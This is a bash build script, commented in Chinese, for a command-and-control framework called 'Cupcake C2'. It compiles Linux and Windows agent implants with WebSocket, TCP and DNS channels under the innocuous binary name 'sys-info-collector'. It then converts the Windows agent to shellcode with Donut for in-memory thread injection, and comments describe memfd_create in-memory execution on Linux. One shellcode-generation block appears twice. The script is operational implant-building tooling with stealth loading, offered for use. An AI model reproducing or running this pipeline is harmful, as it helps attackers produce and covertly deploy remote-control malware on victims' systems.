#!/bin/bash

# Cupcake C2 - 客户端模板生成脚本
# 该脚本将编译不同平台下的 Agent 模板，存放在 server/assets 中供“一键生成”功能使用。

set -e

# 确保脚本在自身所在目录下运行
cd "$(dirname "$0")"
BASE_DIR=$(pwd)

# 颜色定义
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

ASSETS_DIR="$BASE_DIR/server/assets"
CLIENT_DIR="$BASE_DIR/Client"

echo -e "${BLUE}=========================================${NC}"
echo -e "${BLUE}    Cupcake C2 - Template Generator      ${NC}"
echo -e "${BLUE}=========================================${NC}"

mkdir -p "$ASSETS_DIR"

# 检查是否安装了必要的交叉编译 Target (针对 Windows)
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    echo -e "${YELLOW}[*] 检测到 Linux 环境，准备交叉编译工具链...${NC}"
    # rustup target add x86_64-pc-windows-gnu || true
fi

build_template() {
    local platform=$1
    local arch=$2
    local features=$3
    local output_name=$4
    local target=""

    echo -e "${YELLOW}[*] 正在构建模板: $output_name ($platform $arch)...${NC}"

    case $platform in
        windows)
            if [ "$arch" == "x86" ]; then target="i686-pc-windows-gnu"; else target="x86_64-pc-windows-gnu"; fi
            ;;
        linux)
            if [ "$arch" == "arm64" ]; then target="aarch64-unknown-linux-gnu"; else target="x86_64-unknown-linux-gnu"; fi
            ;;
    esac

    cd "$CLIENT_DIR"
    
    # 清理旧的编译产物
    cargo clean
    
    # 针对 ARM64 的特殊编译器和链接器配置
    if [ "$target" == "aarch64-unknown-linux-gnu" ]; then
        export CC=aarch64-linux-gnu-gcc
        export AR=aarch64-linux-gnu-ar
        export CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc
    fi

    if [ -n "$target" ]; then
        cargo build --release --target "$target" --no-default-features --features "$features"
        local binary_path="target/$target/release/sys-info-collector"
        if [ "$platform" == "windows" ]; then binary_path+=".exe"; fi
    else
        cargo build --release --no-default-features --features "$features"
        local binary_path="target/release/sys-info-collector"
        if [ "$platform" == "windows" ]; then binary_path+=".exe"; fi
    fi

    if [ -f "$binary_path" ]; then
        cd ..
        cp "$CLIENT_DIR/$binary_path" "$ASSETS_DIR/$output_name"
        echo -e "${GREEN}[+] 成功生成模板: $ASSETS_DIR/$output_name${NC}"
    else
        echo -e "${RED}[!] 错误: 未找到编译产物 $binary_path ${NC}"
        cd ..
        exit 1
    fi
    
    # 重置环境变量
    unset CC AR CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER
}

# 1. 生成 Linux 模板
# WebSocket
build_template "linux" "x64" "ws" "client_template_linux"
build_template "linux" "arm64" "ws" "client_template_linux_arm64"
# TCP
build_template "linux" "x64" "tcp" "client_template_linux_tcp"
# DNS
build_template "linux" "x64" "dns" "client_template_linux_dns"

# 2. 生成 Windows 模板
# WebSocket
build_template "windows" "x64" "ws" "client_template_windows.exe"
build_template "windows" "x86" "ws" "client_template_windows_x86.exe"
# TCP
build_template "windows" "x64" "tcp" "client_template_windows_tcp.exe"
# DNS
build_template "windows" "x64" "dns" "client_template_windows_dns.exe"

# 3. 自动生成 Shellcode (.bin) 模板 (使用 Donut)
echo -e "${YELLOW}[*] 正在使用 Donut 生成全平台内存 Shellcode...${NC}"
if command -v donut &> /dev/null; then
    # --- Windows x64 Shellcode ---
    donut -i "$ASSETS_DIR/client_template_windows.exe" -o "$ASSETS_DIR/agent_win_x64_shellcode.bin" -a 2
    echo -e "${GREEN}[+] 成功生成 Windows Shellcode: $ASSETS_DIR/agent_win_x64_shellcode.bin${NC}"

    # --- Windows x64 Shellcode ---
    # Donut 对 Windows PE 文件 (EXE/DLL) 支持最好，通过线程注入实现内存加载
    donut -i "$ASSETS_DIR/client_template_windows.exe" -o "$ASSETS_DIR/agent_win_x64_shellcode.bin" -a 2
    echo -e "${GREEN}[+] 成功生成 Windows Shellcode: $ASSETS_DIR/agent_win_x64_shellcode.bin${NC}"

    # --- Linux Note ---
    # Linux 我们不再生成 .bin Shellcode，因为 Rust 编译的 ELF 体积较大且结构复杂，
    # 转换为 Shellcode 极其不稳定且易报 "File is invalid"。
    # Linux 侧已统一使用 memfd_create (文件句柄在内存运行) 方案，无需变为 Shellcode。
else
    echo -e "${RED}[!] 警告: 未找到 donut 工具，跳过 Shellcode 模板生成。${NC}"
fi

echo -e "${BLUE}-----------------------------------------${NC}"
echo -e "${GREEN}[DONE] 所有基础模板与全平台 Shellcode 已就绪。${NC}"
echo -e "${GREEN}[+] 统一内存加载方案：${NC}"
echo -e "    - Windows: 使用 Shellcode 注入器 (线程注入)${NC}"
echo -e "    - Linux:   使用 memfd_create 或 Shellcode 运行器${NC}"
echo -e "${BLUE}-----------------------------------------${NC}"
